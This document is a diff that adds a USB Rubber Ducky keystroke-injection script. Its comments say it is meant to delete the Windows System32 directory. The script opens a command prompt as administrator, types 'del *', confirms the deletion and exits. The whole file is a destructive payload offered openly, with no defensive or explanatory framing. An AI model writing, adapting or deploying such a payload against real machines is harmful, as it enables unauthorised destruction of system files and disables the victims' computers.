@@ -1,0 +1,27 @@
+REM Deletes System32 directory as Administrator using command prompt payload 
+REM Obviouly a rubber ducky script that deletes important directory of 
+REM windows operating system using command prompt.
+REM Delay for 3 seconds
+DELAY 3000
+REM Press the Windows key and type "cmd"
+GUI r
+DELAY 500
+STRING cmd
+REM Delay for 2 seconds
+DELAY 2000
+REM Press Control+Shift+Enter to open the Command Prompt as an administrator
+CONTROL SHIFT ENTER
+REM Typing the string del * command
+STRING del *
+DELAY 1000
+ENTER
+REM Confirmation to delete [Y/N]
+DELAY 1000
+STRING y
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+
+
+
